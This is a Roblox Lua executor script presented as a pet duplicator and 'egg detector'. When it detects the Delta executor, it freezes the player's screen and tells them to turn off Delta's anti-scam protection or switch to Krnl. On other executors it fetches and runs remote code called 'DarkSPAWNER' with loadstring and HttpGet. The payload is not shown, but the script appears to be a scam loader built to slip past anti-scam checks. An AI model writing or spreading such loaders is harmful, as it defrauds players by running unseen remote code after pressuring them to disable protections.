--[[
    Delta Executor Detection + Freeze Lock by Nelli (Recreated in Lua for Roblox)

    This script aims to replicate the functionality and visual style of the
    HTML UI for a Roblox environment. It detects if the script is running
    on a "Delta" executor, and if so, applies a freeze effect and displays
    a custom UI with a message and a copy button.

    Note: This is a client-side script (LocalScript) and should be placed
    in StarterPlayerScripts or PlayerGui.
]]

local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local player = Players.LocalPlayer
local camera = workspace.CurrentCamera
local playerGui = player:WaitForChild("PlayerGui")

-- Function to detect executor (based on original user-provided logic)
local function getExecutorName()
    -- Debugging: Print which detection function is being checked
    if identifyexecutor then
        print("Executor detection: identifyexecutor found.")
        return identifyexecutor()
    elseif getexecutorname then
        print("Executor detection: getexecutorname found.")
        return getexecutorname()
    elseif isdelta then
        print("Executor detection: isdelta found.")
        return "Delta"
    elseif iskrnlclosure then
        print("Executor detection: iskrnlclosure found.")
        return "Krnl"
    elseif syn then
        print("Executor detection: syn found.")
        return "Synapse X"
    elseif is_sirhurt_closure then
        print("Executor detection: is_sirhurt_closure found.")
        return "SirHurt"
    elseif pebc_execute then
        print("Executor detection: pebc_execute found.")
        return "ProtoSmasher"
    elseif isfluxus then
        print("Executor detection: isfluxus found.")
        return "Fluxus"
    else
        print("Executor detection: No known executor detected.")
        return "Unknown"
    end
end

local executor = getExecutorName()
warn("Executor Detected:", executor) -- Output to Roblox console

-- If executor is Delta, activate the freeze screen
if executor:lower():find("delta") then
    print("Delta executor detected. Activating freeze screen.")
    -- Wait for character to load
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    local rootPart = character:WaitForChild("HumanoidRootPart")

    -- 🌀 Blur screen (similar to HTML background blur)
    local blur = Instance.new("BlurEffect")
    blur.Name = "DeltaFreezeBlur"
    blur.Size = 25 -- Adjust blur intensity as needed
    blur.Parent = Lighting
    print("Blur effect applied.")

    -- 🧊 Freeze player
    humanoid.WalkSpeed = 0
    humanoid.JumpPower = 0
    humanoid.AutoRotate = false
    rootPart.Anchored = true
    print("Player frozen.")

    -- 🎥 Lock camera
    -- Ensure the camera exists and is ready
    if not camera then
        camera = workspace:WaitForChild("CurrentCamera")
    end
    camera.CameraType = Enum.CameraType.Scriptable
    -- Position camera relative to the player's root part
    camera.CFrame = CFrame.new(rootPart.Position + Vector3.new(0, 6, 12), rootPart.Position)
    print("Camera locked.")

    -- Create UI (mimicking the HTML modal's appearance)
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "DeltaDetectionUI"
    screenGui.IgnoreGuiInset = true
    screenGui.ResetOnSpawn = false -- Keep UI after player respawns
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.Parent = playerGui
    print("ScreenGui created and parented.")

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 200) -- Fixed size like in HTML
    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 36) -- Dark gray/black from green.png
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    print("Main frame created.")

    local uiCorner = Instance.new("UICorner")
    uiCorner.CornerRadius = UDim.new(0, 10) -- Rounded corners
    uiCorner.Parent = mainFrame

    local title = Instance.new("TextLabel")
    title.Text = "⚠️ Executor Not Supported" -- Reverted to "Executor Not Supported" from green.png
    title.Font = Enum.Font.GothamBold -- Using GothamBold for emphasis
    title.TextSize = 20 -- Reverted size
    title.TextColor3 = Color3.fromRGB(0, 255, 0) -- Bright green from green.png
    title.BackgroundTransparency = 1
    title.Size = UDim2.new(1, -40, 0, 30)
    title.Position = UDim2.new(0, 20, 0, 10)
    title.TextWrapped = true
    title.TextXAlignment = Enum.TextXAlignment.Center
    title.TextYAlignment = Enum.TextYAlignment.Center
    title.Parent = mainFrame
    print("Title label created.")

    local messageText = Instance.new("TextLabel")
    -- Reverted text content to match green.png, including "Closing in 59 seconds..."
    messageText.Text = "You're using an unsupported executor (Delta).\n\nTo fix:\n- Turn off anti-scam in Delta\n- Or use Krnl executor.\n\nClosing in 59 seconds..."
    messageText.Font = Enum.Font.Gotham
    messageText.TextSize = 12
    messageText.TextColor3 = Color3.fromRGB(255, 255, 255) -- White from green.png
    messageText.BackgroundTransparency = 1
    messageText.Size = UDim2.new(1, -40, 0, 100)
    messageText.Position = UDim2.new(0, 20, 0, 40)
    messageText.TextWrapped = true
    messageText.TextXAlignment = Enum.TextXAlignment.Center
    messageText.TextYAlignment = Enum.TextYAlignment.Top
    messageText.Parent = mainFrame
    print("Message label created.")

    -- Copy Button
    local copyButton = Instance.new("TextButton")
    copyButton.Size = UDim2.new(0, 200, 0, 36)
    copyButton.Position = UDim2.new(0.5, -100, 1, -50)
    copyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0) -- Green from green.png
    copyButton.Text = "Copy Krnl Link"
    copyButton.Font = Enum.Font.GothamBold -- Using GothamBold for button
    copyButton.TextSize = 16
    copyButton.TextColor3 = Color3.fromRGB(0, 0, 0) -- Black text for contrast
    copyButton.AutoButtonColor = true
    copyButton.Parent = mainFrame
    print("Copy button created.")

    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 6)
    buttonCorner.Parent = copyButton

    -- Copy functionality (using setclipboard for Roblox)
    copyButton.MouseButton1Click:Connect(function()
        local success, err = pcall(function()
            setclipboard("https://krnl.cat/downloads/")
        end)
        if success then
            copyButton.Text = "Copied!"
            print("Krnl link copied to clipboard.")
        else
            copyButton.Text = "Copy Failed!"
            warn("Failed to copy Krnl link:", err)
        end
        task.wait(1)
        copyButton.Text = "Copy Krnl Link"
    end)

    -- 🔧 Hide TopBar (ESC/menu)
    local success_topbar, err_topbar = pcall(function()
        StarterGui:SetCore("TopbarEnabled", false)
    end)
    if not success_topbar then
        warn("Failed to hide TopBar:", err_topbar)
    end

    -- ⛔ Block input backup
    UserInputService.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Keyboard or input.UserInputType == Enum.UserInputType.Gamepad1 then
            input:CaptureController()
        end
    end)
    print("Input blocking enabled.")
else
    print("Non-Delta executor detected. Attempting to load DarkSPAWNER script.")
    -- ✅ Not Delta → continue loading Egg Detector script (from original user-provided logic)
    -- Corrected syntax: removed extra 'end)' at the end of the loadstring pcall
    local success_loadstring, err_loadstring = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GrowAGarden-updated/PetDuplicator/refs/heads/main/DarkSPAWNER"))()
    end)
    if success_loadstring then
        print("DarkSPAWNER script loaded successfully.")
    else
        warn("Failed to load DarkSPAWNER script:", err_loadstring)
    end
end
